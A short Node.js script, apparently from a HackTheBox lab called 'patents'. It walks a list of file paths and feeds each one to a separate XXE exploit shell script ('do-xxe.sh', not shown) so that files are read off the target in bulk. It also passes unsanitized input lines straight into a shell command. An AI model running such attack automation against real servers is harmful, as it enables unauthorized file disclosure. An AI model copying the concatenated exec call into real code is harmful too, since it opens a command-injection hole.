const lineReader = require('line-reader');
const { exec } = require('child_process');

const skip = parseInt(process.argv[4] || '0');
let linesSkipped = 0;
let lineCount = skip;
let listFile = process.argv[3];
let pathPrefix = process.argv[2];

console.log('Opening ' + listFile);
lineReader.open(listFile, function(err, reader) {

    if (err) {
        console.error('Error', err);
        process.exit(1);
    }

    let lastSkippedLine = '';
    while(linesSkipped++ < skip) {
        reader.nextLine((err, line) => {
            if (err) {
                console.error('Error', err);
                process.exit(1);
            }
            lastSkippedLine = line;
        });
    }
    console.log('Skipped to ' + lastSkippedLine);

    let interval = setInterval(() => {
        if (reader.hasNextLine()) {
            reader.nextLine((err,line) => {
                if (err) {
                    console.error('Error', err);
                    process.exit(1);
                }
                requestInProgress = true;
                exec('/home/zoey/htb/patents/xxe/do-xxe.sh ' + pathPrefix + line, (error, stdout, stderr) => {
                    if (error) {
                        console.log('ERROR', error)
                    } else {
                        console.log(lineCount++ + ' - ' + pathPrefix + line);
                    }
                });
            });
        } else {
            clearInterval(interval);
        }
    }, 100);

});